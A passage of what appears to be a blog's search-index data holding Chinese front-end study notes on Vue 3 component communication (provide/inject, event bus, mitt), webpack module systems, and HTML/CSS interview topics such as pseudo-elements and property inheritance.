&lt;button @click&#x3D;&quot;change&quot;&gt;change&lt;&#x2F;button&gt; &lt;div class&#x3D;&quot;child2&quot;&gt; &lt;child2 &#x2F;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; .child2 &#123; background-color: red; width: 100px; height: 100px; &#125; &lt;&#x2F;style&gt; let d &#x3D; inject(&#39;data&#39;, reactive(&#123; name: &#39;kif&#39; &#125;)) 第二个参数是指定默认值，否则 d.name 无法识别，d类型为unknoum 修改时所有界面的数据都会更改 child2.vue &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-07 17:03:37 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-07 17:06:50 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;child&quot;&gt; child2 &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 17.兄弟组件传参17.1 借助父组件父组件： &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import child1 from &#39;.&#x2F;child1.vue&#39; import child2 from &#39;.&#x2F;child2.vue&#39; import &#123;ref &#125; from &#39;vue&#39; let dataD &#x3D;ref(false) const getData&#x3D;(data:boolean)&#x3D;&gt;&#123; dataD.value&#x3D; data console.log(dataD) &#125; &lt;&#x2F;script&gt; &lt;template&gt; &lt;div class&#x3D;&quot;index&quot;&gt; index: &#123;&#123;dataD&#125;&#125; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;child1&quot;&gt; child1： &lt;child1 @on-click&#x3D;&#39;getData&#39; &#x2F;&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;child2&quot;&gt; child2： &lt;child2 :data&#x3D;&quot;dataD&quot; &#x2F;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; .index&#123; background-color: blueviolet; width: 300px; height: 300px; border: 1px solid red; &#125; .child1&#123; background-color: green; width: 200px; height: 200px; border: 1px solid red; float:left; &#125; .child2&#123; background-color: blue; width: 200px; height: 200px; border: 1px solid red; float:left; &#125; &lt;&#x2F;style&gt; 子组件1： &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; reactive, ref, watch &#125; from &#39;vue&#39; let data &#x3D;ref(false) const emit &#x3D; defineEmits([&#39;on-click&#39;]) const bu &#x3D; () &#x3D;&gt; &#123; data.value &#x3D; !data.value emit(&#39;on-click&#39;, data) &#125; &lt;&#x2F;script&gt; &lt;template&gt; child1 &lt;div class&#x3D;&quot;main&quot;&gt; &lt;button @click&#x3D;&quot;bu&quot;&gt; 派发 &lt;&#x2F;button&gt; &#123;&#123;data&#125;&#125; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 子组件2： &lt;script setup lang&#x3D;&quot;ts&quot;&gt; type props &#x3D; &#123; data: boolean &#125; defineProps&lt;props&gt;() &lt;&#x2F;script&gt; &lt;template&gt; child2 &#123;&#123; data &#125;&#125; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 子组件1 通过emits 将数据给到父组件，父组件接收后给到子组件2，子组件2 通过props接受 17.2 eventbus&#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-09 11:38:25 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-09 11:38:25 *&#x2F; type BusClass &#x3D; &#123; emit: (name: string) &#x3D;&gt; void, on: (name: string, callback: Function) &#x3D;&gt; void, &#125; type PramsKey &#x3D; string | number | symbol; type List &#x3D; &#123; [key: PramsKey]: Array&lt;Function&gt; &#125;; class Bus implements BusClass &#123; list: List constructor() &#123; this.list &#x3D; &#123;&#125;; console.log(&#39;bus created&#39;) &#125; emit(name: string, ...args: Array&lt;any&gt;) &#123; console.log(&#96;emit $&#123;name&#125;&#96;) let emitName: Array&lt;Function&gt; &#x3D; this.list[name] emitName.forEach(fn &#x3D;&gt; &#123; fn.apply(this,args) &#125;) &#125; on(name: string, callback: Function) &#123; console.log(&#96;on $&#123;name&#125;&#96;) let fun: Array&lt;Function&gt; &#x3D; this.list[name] || [] fun.push(callback) this.list[name] &#x3D; fun &#125; &#125; export default new Bus() index.vue &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import A from &#39;.&#x2F;a.vue&#39; import B from &#39;.&#x2F;b.vue&#39; &lt;&#x2F;script&gt; &lt;template&gt; eventBus &lt;div class&#x3D;&quot;a&quot;&gt; &lt;A &#x2F;&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;b&quot;&gt; &lt;B &#x2F;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; .a &#123; background-color: red; width: 100px; height: 100px; border: 1pxx solid red; &#125; .b &#123; background-color: blue; width: 100px; height: 100px; border: 1pxx solid blue; &#125; &lt;&#x2F;style&gt; a.vue: &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-09 11:37:57 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-09 11:37:57 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import Bus from &#39;..&#x2F;..&#x2F;bus&#39; import &#123; ref &#125; from &#39;vue&#39; let Flag &#x3D; (false) const emit &#x3D; () &#x3D;&gt; &#123; Flag &#x3D; !Flag Bus.emit(&#39;on-click&#39;, Flag) &#125; &lt;&#x2F;script&gt; &lt;template&gt; A &lt;div class&#x3D;&quot;main&quot;&gt; &lt;button @click&#x3D;&quot;emit&quot;&gt;click&lt;&#x2F;button&gt; &#123;&#123; Flag &#125;&#125; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; b.vue: &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-09 11:39:33 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-09 11:39:33 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import Bus from &#39;..&#x2F;..&#x2F;bus&#39; import &#123; ref &#125; from &#39;vue&#39; let Flag &#x3D; ref(false) Bus.on(&#39;on-click&#39;, (flag: boolean) &#x3D;&gt; &#123; Flag.value &#x3D; flag &#125;) &lt;&#x2F;script&gt; &lt;template&gt; B &#123;&#123;Flag&#125;&#125; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 17.3 mitt安装：npm install --save mitt 全局注册：main.tsimport &#123; createApp &#125; from &#39;vue&#39; import App from &#39;.&#x2F;App.vue&#39; import &#39;.&#x2F;assets&#x2F;css&#x2F;reset.less&#39; import card from &#39;.&#x2F;components&#x2F;card&#x2F;index.vue&#39; import mitt from &#39;mitt&#39; const Mit &#x3D; mitt() const app &#x3D; createApp(App) declare module &#39;vue&#39; &#123; export interface ComponentCustomProps &#123; $Bus: typeof Mit &#125; &#125; app.config.globalProperties.$Bus &#x3D; Mit app.component(&#39;card&#39;, card).mount(&#39;#app&#39;) 使用：emit:&#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-09 11:37:57 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-09 11:40:50 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import Bus from &#39;..&#x2F;..&#x2F;bus&#39; import &#123; ref &#125; from &#39;vue&#39; import &#123; getCurrentInstance &#125; from &#39;vue&#39; const instance &#x3D; getCurrentInstance() let Flag &#x3D; (false) &#x2F;&#x2F; const emit &#x3D; () &#x3D;&gt; &#123; &#x2F;&#x2F; Flag &#x3D; !Flag &#x2F;&#x2F; Bus.emit(&#39;on-click&#39;, Flag) &#x2F;&#x2F; &#125; const emit &#x3D; () &#x3D;&gt; &#123; instance?.proxy?.$Bus.emit(&#39;on-click&#39;, Flag) &#125; &lt;&#x2F;script&gt; &lt;template&gt; A &lt;div class&#x3D;&quot;main&quot;&gt; &lt;button @click&#x3D;&quot;emit&quot;&gt;click&lt;&#x2F;button&gt; &#123;&#123; Flag &#125;&#125; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; &#x2F;* * @Author: kif kif101001000@163.com * @Date: 2022-06-09 11:39:33 * @Last Modified by: kif kif101001000@163.com * @Last Modified time: 2022-06-09 11:41:30 *&#x2F; &lt;script setup lang&#x3D;&quot;ts&quot;&gt; import Bus from &#39;..&#x2F;..&#x2F;bus&#39; import &#123; ref &#125; from &#39;vue&#39; import &#123; getCurrentInstance &#125; from &#39;vue&#39; const instance &#x3D; getCurrentInstance() instance?.proxy?.$Bus.on(&#39;on-click&#39;, (flag:boolean) &#x3D;&gt; &#123; console.log(flag) &#125;) let Flag &#x3D; ref(false) &#x2F;&#x2F; Bus.on(&#39;on-click&#39;, (flag: boolean) &#x3D;&gt; &#123; &#x2F;&#x2F; Flag.value &#x3D; flag &#x2F;&#x2F; &#125;) &lt;&#x2F;script&gt; &lt;template&gt; B &#123;&#123;Flag&#125;&#125; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 18.unplugin-auto-importgithub地址： https://github.com/antfu/unplugin-auto-import 可以避免重复引用ref，reactive等多次导入 安装： npm i -D unplugin-auto-import vite.config.ts编辑： import &#123; defineConfig &#125; from &#39;vite&#39; import vue from &#39;@vitejs&#x2F;plugin-vue&#39; import autoimport from &#39;unplugin-auto-import&#x2F;vite&#39; &#x2F;&#x2F; https:&#x2F;&#x2F;vitejs.dev&#x2F;config&#x2F; export default defineConfig(&#123; plugins: [vue(), autoimport(&#123; &#x2F;&#x2F; 允许自动导入 imports: [&#39;vue&#39;], dts:&#39;src&#x2F;autoimport.d.ts&#39;, &#125;)] &#125;) src目录下就会生成 autoimport.d.ts"},{"title":"webpack学习笔记","path":"/post/5883.html","text":"学习中。。。 webpack为什么需要Webpack原始开发模式各种js文件引入，顺序不能乱，引入的数据太大，各种js之间有关联，可以考虑所有文件复制到一个js文件里，但又有作用域问题、文件太大、可维护性差 作用域问题：grunt和gulp两个工具来解决 方法：立即执行函数 ; (function () &#123; let myName = 'kif' &#125;)() console.log(myName)//ReferenceError: myName is not defined let res = (function () &#123; let myName = 'kif' return myName &#125;)() console.log(res)//kif 文件太大：对于可以js库，只使用其中一个方法而把所有的js文件加载下来不适合 方法：代码差分 commonJs CommonJS 模块规范代表：Node.js 每个文件就是一个模块，有自己的作用域。在一个文件里面定义的变量、函数、类，都是私有的，对其他文件不可见。 暴露方法：module.exports math.js: const add = function (x, y) &#123; return x + y &#125; const sub = function (x, y) &#123; return x - y &#125; module.exports = &#123; add, sub &#125; 引用方法:require const math = require('./math.js') console.log(math.add(4, 5)) 但只能在Nodejs环境下运行，对于浏览器环境不支持requirejs暴露方法：define([],function(){}) 参数1：[]，内容是需要的模块 参数2：function:回调函数，return 暴露的方法 eg: add.js const add=(x,y)=>&#123; return x+y &#125; define([],function()&#123; return add &#125;) 引用方法：require([],function(){}) 参数1：引入模块文件 参数2：回调函数，参数是方法，内容直接使用方法 eg: server.js require(['./add.js'], function (add) &#123; console.log(add(4, 5)) &#125;) &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;title>Document&lt;/title> &lt;script src=\"https://cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js\" data-main=\"../server.js\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> ECMAScript暴露方法export default eg: add.js const add = function(x,y)&#123; return x+y &#125; export default add 引用方法import from eg: import add from './add.js' add(1,2) 注：script标签需要指定type&#x3D;”module”,否则： 问题：部分浏览器不支持 webpack就可以支持connonjs和使得ECMAScript良好兼容浏览器webpack和同类工具比较parcel“零配置”，少量的库 rollup只用来打包js webpack拆分代码、继承大量库、静态文件，支持Commonjs,ESMAScript ViteVue官方,基于esmodule webpack使用前提：nodejs 安装： npm install webpack webpack-cli --g 全局安装 当前工作区安装 npm init -y npm install webpack webpack-cli --save-dev 将hello.js 和main.js打包 hello.js function hello()&#123; console.log('hello world') &#125; export default hello main.js import hello from './hello.js' hello() 可以注意到使用的的是ESmodule方法 打包：webpack 生成dist&#x2F;bundle.js /******/ (() => &#123; // webpackBootstrap /******/ \"use strict\"; /******/ var __webpack_modules__ = ([ /* 0 */, /* 1 */ /***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => &#123; __webpack_require__.r(__webpack_exports__); /* harmony export */ __webpack_require__.d(__webpack_exports__, &#123; /* harmony export */ \"default\": () => (__WEBPACK_DEFAULT_EXPORT__) /* harmony export */ &#125;); function hello()&#123; console.log('hello world') &#125; /* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = (hello); /***/ &#125;) /******/ ]); /************************************************************************/ /******/ // The module cache /******/ var __webpack_module_cache__ = &#123;&#125;; /******/ /******/ // The require function /******/ function __webpack_require__(moduleId) &#123; /******/ // Check if module is in cache /******/ var cachedModule = __webpack_module_cache__[moduleId]; /******/ if (cachedModule !== undefined) &#123; /******/ return cachedModule.exports; /******/ &#125; /******/ // Create a new module (and put it into the cache) /******/ var module = __webpack_module_cache__[moduleId] = &#123; /******/ // no module.id needed /******/ // no module.loaded needed /******/ exports: &#123;&#125; /******/ &#125;; /******/ /******/ // Execute the module function /******/ __webpack_modules__[moduleId](module, module.exports, __webpack_require__); /******/ /******/ // Return the exports of the module /******/ return module.exports; /******/ &#125; /******/ /************************************************************************/ /******/ /* webpack/runtime/define property getters */ /******/ (() => &#123; /******/ // define getter functions for harmony exports /******/ __webpack_require__.d = (exports, definition) => &#123; /******/ for(var key in definition) &#123; /******/ if(__webpack_require__.o(definition, key) &amp;&amp; !__webpack_require__.o(exports, key)) &#123; /******/ Object.defineProperty(exports, key, &#123; enumerable: true, get: definition[key] &#125;); /******/ &#125; /******/ &#125; /******/ &#125;; /******/ &#125;)(); /******/ /******/ /* webpack/runtime/hasOwnProperty shorthand */ /******/ (() => &#123; /******/ __webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop)) /******/ &#125;)(); /******/ /******/ /* webpack/runtime/make namespace object */ /******/ (() => &#123; /******/ // define __esModule on exports /******/ __webpack_require__.r = (exports) => &#123; /******/ if(typeof Symbol !== 'undefined' &amp;&amp; Symbol.toStringTag) &#123; /******/ Object.defineProperty(exports, Symbol.toStringTag, &#123; value: 'Module' &#125;); /******/ &#125; /******/ Object.defineProperty(exports, '__esModule', &#123; value: true &#125;); /******/ &#125;; /******/ &#125;)(); /******/ /************************************************************************/ var __webpack_exports__ = &#123;&#125;; // This entry need to be wrapped in an IIFE because it need to be isolated against other modules in the chunk. (() => &#123; __webpack_require__.r(__webpack_exports__); /* harmony import */ var _hello_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(1); (0,_hello_js__WEBPACK_IMPORTED_MODULE_0__[\"default\"])() &#125;)(); /******/ &#125;)() ; Resource资源模块module:&#123; rules:[ &#123; test: /\\.png/, //匹配资源名称，这里是png图片 type: \"asset/resource\", //asset/resource 将资源分割为单独的文件，并导出url，就是之前的 file-loader的功能. generator: &#123; filename: \"images/[hash][ext][query]\", &#125;, //输出文件位置与名称 &#125;, ] &#125;"},{"title":"前端面试题目","path":"/post/f1e8.html","text":"html基础1.自定义列表&lt;!DOCTYPE html> &lt;html lang=\"zh\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> &lt;title>&lt;/title> &lt;/head> &lt;body> &lt;dl> &lt;dt>&lt;/dt> &lt;dd>&lt;/dd> &lt;dd>&lt;/dd> &lt;/dl> &lt;/body> 1.dt中一般是你的列表的表头2.dd中相当于ul的li中相同的内容 自定义列表一般用于以下内容 2.多媒体标签之音频标签音频标签以为代表，音频标签属性如下：autoplay&#x3D;”autoplay” 打开页面后，音频会自动播放controls&#x3D;”controls” 在页面显示控件，比如播放按钮loop&#x3D;”loop” 循环播放当前音频src&#x3D;”url” 导入音频文件地址(url是文件地址的统称举例)注意：1.谷歌浏览器把autoplay(自动播放)属性给禁用了，所以在谷歌浏览器中没法实现音频自动播放。2.因为不同浏览器的支持格式不同，我们采取的解决方案是为一个音频准备多个如格式的文件，举例如下： &lt;audio controls=\"controls\"> &lt;source src=\"E:\\HTML+CSS\\案例\\media\\案例1.mp3\" type=\"audio/mpeg\"> &lt;source src=\"E:\\HTML+CSS\\案例\\media\\案例1.ogg\" type=\"audio/ogg\"> 您的浏览器需要升级，目前不支持audio播放 &lt;/audio> 3.onerror 事件onerror 事件在视频&#x2F;音频（audio&#x2F;video）数据加载期间发生错误时触发。 &lt;video onerror&#x3D;&quot;myFunction()&quot;&gt; 4、为什么link用href获取资源 script和img用src参考答案： src用于替换当前元素，href用于在当前文档和引用资源之间确立联系。 src src是source的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将其指向的资源下载并应用到文档内，例如js脚本，img图片和frame等元素 &lt;script src =\"js.js\">&lt;/script> 当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架 等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部 href href是Hypertext Reference的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接 在文档中添加link标签，浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用link方式来加载css，而不是使用@import方式 &lt;link href=\"common.css\" rel=\"stylesheet\"/> CSS1.css选择某一个 (CSS :first-child 选择器,CSS选择器——伪类选择器)q:请将html模块中ul列表的第2个li标签和第4个li标签的背景颜色设置成”rgb(255, 0, 0)”。 &lt;html> &lt;head> &lt;meta charset=utf-8> &lt;style type=\"text/css\"> /*补全代码*/ &lt;/style> &lt;/head> &lt;body> &lt;ul> &lt;li>1&lt;/li> &lt;li>2&lt;/li> &lt;li>3&lt;/li> &lt;li>4&lt;/li> &lt;/ul> &lt;/body> &lt;/html> CSS :first-child 选择器：:first-child 选择器用于选取属于其父元素的首个子元素的指定选择器。 ul > :first-child + li&#123; margin-right: 50px; &#125; ul > :first-child + li + li+ li&#123; margin-right: 50px; &#125; 2、CSS 边框属性p &#123; border:5px solid red; &#125; 可以按顺序设置如下属性： border-width border-style border-color border-style可能的值 值 描述 none 定义无边框。 hidden 与 “none” 相同。不过应用于表时除外，对于表，hidden 用于解决边框冲突。 dotted 定义点状边框。在大多数浏览器中呈现为实线。 dashed 定义虚线。在大多数浏览器中呈现为实线。 solid 定义实线。 double 定义双线。双线的宽度等于 border-width 的值。 groove 定义 3D 凹槽边框。其效果取决于 border-color 的值。 ridge 定义 3D 垄状边框。其效果取决于 border-color 的值。 inset 定义 3D inset 边框。其效果取决于 border-color 的值。 outset 定义 3D outset 边框。其效果取决于 border-color 的值。 inherit 规定应该从父元素继承边框样式。 eg: 圣诞节来啦！请用CSS给你的朋友们制作一颗圣诞树吧~这颗圣诞树描述起来是这样的： 1. &quot;topbranch&quot;是圣诞树的上枝叶，该上枝叶仅通过边框属性、左浮动、左外边距即可实现。边框的属性依次是：宽度为100px、是直线、颜色为green（未显示的边框颜色都为透明） 2. &quot;middleBranch&quot;是圣诞树的中枝叶，该上枝叶仅通过边框属性即可实现。边框的属性依次是：宽度为200px、是直线、颜色为green（未显示的边框颜色都为透明） 3. &quot;base&quot;是圣诞树的树干，该树干仅通过左外边距实现居中于中枝叶。树干的宽度、高度分别为70px、200px，颜色为gray。 注意： 1. 上枝叶、树干的居中都是通过左外边距实现的 2. 没有显示的边框，其属性都是透明（属性） 3. 仅通过border属性完成边框的所有属性设置 &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=utf-8> &lt;style type=\"text/css\"> .topbranch &#123; width: 0px; height: 0px; /* * TODO: 上枝叶效果 */ float:left; border-bottom:100px solid green; border-left:100px solid transparent; border-right:100px solid transparent; border-top:100px solid transparent; margin-left:100px &#125; .middleBranch &#123; width: 0px; height: 0px; /* * TODO: 中枝叶效果 */ border-bottom:200px solid green; border-left:200px solid transparent; border-top:200px solid transparent; border-right:200px solid transparent; &#125; .base &#123; /* * TODO: 树干效果 */ width:70px; height:200px; background-color:gray; float:left; margin-left:165px &#125; &lt;/style> &lt;/head> &lt;body> &lt;section class=\"topbranch\">&lt;/section> &lt;section class=\"middleBranch\">&lt;/section> &lt;section class=\"base\">&lt;/section> &lt;/body> &lt;/html> 3、 CSS选择器——伪元素伪元素是一个附加在选择器末尾的关键词，通过伪元素您不需要借助元素的 ID 或 class 属性就可以对被选择元素的特定部分定义样式。例如通过伪元素您可以设置段落中第一个字母的样式，或者在元素之前、之后插入一些内容等等。 在 CSS1 和 CSS2 中，伪元素的使用与伪类相同，都是使一个冒号:与选择器相连。但在 CSS3 中，将伪元素单冒号的使用方法改为了使用双冒号::，以此来区分伪类和伪元素。因此，建议在使用伪元素时使用双冒号而不是单冒号。 selector::pseudo-element &#123; property: value; &#125; 其中，selector 为选择器，pseudo-element 为伪元素的名称，property 为 CSS 中的属性，value 为属性对应的值。 CSS 中提供了一系列的伪元素，如下表所示： 伪元素 例子 例子描述 ::after p::after 在每个 元素之后插入内容 ::before p::before 在每个 元素之前插入内容 ::first-letter p::first-letter 匹配每个 元素中内容的首字母 ::first-line p::first-line 匹配每个 元素中内容的首行 ::selection p::selection 匹配用户选择的元素部分 ::placeholder input::placeholder 匹配每个表单输入框（例如 ）的 placeholder 属性 1. ::after伪元素 ::after 能够在指定元素的后面插入一些内容，在 ::after 中需要使用 content 属性来定义要追加的内容，而且在 ::after 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空&quot;&quot;）。 &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;style> p.one::after &#123; content:\"\"; display: inline-block; width: 50px; height: 10px; background: blue; &#125; p.two::after &#123; content:\"要插入的内容\"; color: red; font-size: 6px; &#125; p.three::after &#123; content: url('./smiley.gif'); position: relative; top: 8px; &#125; &lt;/style> &lt;/head> &lt;body> &lt;p class=\"one\">伪元素 ::after&lt;/p> &lt;p class=\"two\">伪元素 ::after&lt;/p> &lt;p class=\"three\">伪元素 ::after&lt;/p> &lt;/body> &lt;/html> 2. ::before伪元素 ::before 能够在指定元素的前面插入一些内容。与 ::after 相似，::before 中也需要使用 content 属性来定义要追加的内容，而且在 ::before 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空&quot;&quot;）。 &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;style> p.one::before &#123; content:\"\"; display: inline-block; width: 50px; height: 10px; background: blue; &#125; p.two::before &#123; content:\"要插入的内容\"; color: red; font-size: 6px; &#125; p.three::before &#123; content: url('./smiley.gif'); position: relative; top: 8px; &#125; &lt;/style> &lt;/head> &lt;body> &lt;p class=\"one\">伪元素 ::before&lt;/p> &lt;p class=\"two\">伪元素 ::before&lt;/p> &lt;p class=\"three\">伪元素 ::before&lt;/p> &lt;/body> &lt;/html> 3. ::first-letter伪元素 ::first-letter 用来设置指定元素中内容第一个字符的样式，通常用来配合 font-size 和 float 属性制作首字下沉效果。需要注意的是，伪元素 ::first-letter 仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。 下面通过示例来演示伪元素 ::first-letter 的使用： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;style> p::first-letter&#123; font-size: 2em; color: blue; &#125; &lt;/style> &lt;/head> &lt;body> &lt;p>伪元素 ::first-letter&lt;/p> &lt;/body> &lt;/html> 4. ::first-line伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。 下面通过示例来演示伪元素 ::first-line 的使用： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;style> p::first-line&#123; font-size: 1.5em; color: blue; font-weight: bold; &#125; &lt;/style> &lt;/head> &lt;body> &lt;p>伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。&lt;/p> &lt;/body> &lt;/html> 5. ::selection伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。 下面通过示例来演示伪元素 ::selection 的使用： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;style> p::selection&#123; color: red; background-color: #CCC; &#125; &lt;/style> &lt;/head> &lt;body> &lt;p>伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。 &lt;/p> &lt;/body> &lt;/html> 运行结果如下图所示： 图：伪元素 ::selection 的使用 6. ::placeholder伪元素 ::placeholder 用来设置表单元素（input、textarea 元素）的占位文本（通过 HTML 的 placeholder 属性设置的文本），示例代码如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; input.text::placeholder&#123; color: red; background-color: #CCC; &#125; &lt;&#x2F;style&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;input placeholder&#x3D;&quot;请输入一段文本&quot;&gt;未使用伪元素 ::placeholder&lt;br&gt; &lt;input placeholder&#x3D;&quot;请输入一段文本&quot; class&#x3D;&quot;text&quot;&gt;使用伪元素 ::placeholder 的效果 &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 运行结果如下图所示： 4、圆角border-radius 5、浮动和清除浮动清除浮动: 父元素内联块元素 inline-block .father&#123; display:inline-block &#125; 6、固定定位position:fixed 7、CSS单位（一）em和rem简单的说 em: 就是字体大小，根据元素自身的字体大小来定，如果自身没有定义字体大小，则继承父元素的字体大小，即1em &#x3D; 1 font-size; rem: 和em差不多，可以看成是root-em，是根据根元素的字体大小来定义的，即html设置的字体大小来定义，默认html的字体大小是16px； 8、继承相关css的继承：就是给父级设置一些属性，子级继承了父级的该属性，这就是我们的css中的继承。 官方解释，继承是一种规则，它允许样式不仅应用于特定的html标签元素，而且应用于其后代元素。 无继承性的属性 1、display：规定元素应该生成的框的类型 2、文本属性： vertical-align：垂直文本对齐 text-decoration：规定添加到文本的装饰 text-shadow：文本阴影效果 white-space：空白符的处理 unicode-bidi：设置文本的方向 3、盒子模型的属性：width、height、margin 、margin-top、margin-right、margin-bottom、margin-left、border、 border-style、border-top-style、border-right-style、border-bottom-style、border-left-style、border-width、border-top-width、border-right-right、border-bottom-width、border-left-width、border-color、border-top-color、border-right-color、border-bottom-color、border-left-color、border-top、border-right、border-bottom、border-left、padding、padding-top、padding-right、padding-bottom、padding-left 4、背景属性：background、background-color、background-image、background-repeat、background-position、background-attachment 5、定位属性：float、clear、position、top、right、bottom、left、min-width、min-height、max-width、max-height、overflow、clip、z-index 6、生成内容属性：content、counter-reset、counter-increment 7、轮廓样式属性：outline-style、outline-width、outline-color、outline 8、页面样式属性：size、page-break-before、page-break-after 9、声音样式属性：pause-before、pause-after、pause、cue-before、cue-after、cue、play-during 有继承性的属性 1、字体系列属性 font：组合字体 font-family：规定元素的字体系列 font-weight：设置字体的粗细 font-size：设置字体的尺寸 font-style：定义字体的风格 font-variant：设置小型大写字母的字体显示文本，这意味着所有的小写字母均会被转换为大写，但是所有使用小型大写 字体的字母与其余文本相比，其字体尺寸更小。 font-stretch：对当前的 font-family 进行伸缩变形。所有主流浏览器都不支持。 font-size-adjust：为某个元素规定一个 aspect 值，这样就可以保持首选字体的 x-height。 2、文本系列属性 text-indent：文本缩进 text-align：文本水平对齐 line-height：行高 word-spacing：增加或减少单词间的空白（即字间隔） letter-spacing：增加或减少字符间的空白（字符间距） text-transform：控制文本大小写 direction：规定文本的书写方向 color：文本颜色 a元素除外 3、元素可见性：visibility 4、表格布局属性：caption-side、border-collapse、border-spacing、empty-cells、table-layout 5、列表布局属性：list-style-type、list-style-image、list-style-position、list-style 6、生成内容属性：quotes 7、光标属性：cursor 8、页面样式属性：page、page-break-inside、windows、orphans 9、声音样式属性：speak、speak-punctuation、speak-numeral、speak-header、speech-rate、volume、voice-family、 pitch、pitch-range、stress、richness、、azimuth、elevation 所有元素可以继承的属性 1、元素可见性：visibility 2、光标属性：cursor 内联元素可以继承的属性 1、字体系列属性 2、除text-indent、text-align之外的文本系列属性 块级元素可以继承的属性 1、text-indent、text-align 9、css预处理工具参考答案： CSS 预处理器是一个能让你通过预处理器自己独有的语法来生成CSS的程序。 css预处理器种类繁多，三种主流css预处理器是Less、Sass（Scss）及Stylus；它们各自的背景如下: Sass： 2007年诞生，最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS（SCSS 需要使用分号和花括号而不是换行和缩进）。 Less： 2009年出现，受SASS的影响较大，但又使用CSS的语法，让大部分开发者和设计师更容易上手，在ruby社区之外支持者远超过SASS。其缺点是比起SASS来，可编程功能不够。优点是简单和兼容CSS，反过来也影响了SASS演变到了SCSS的时代，著名的Twitter Bootstrap就是采用LESS做底层语言的。 Stylus： 2010年产生，来自Node.js社区，主要用来给Node项目进行CSS预处理支持，在此社区之内有一定支持者，在广泛的意义上人气还完全不如SASS和LESS。 比较 在使用 CSS 预处理器之前最重要的是理解语法，幸运的是基本上大多数预处理器的语法跟 CSS 都差不多。 首先 Sass 和 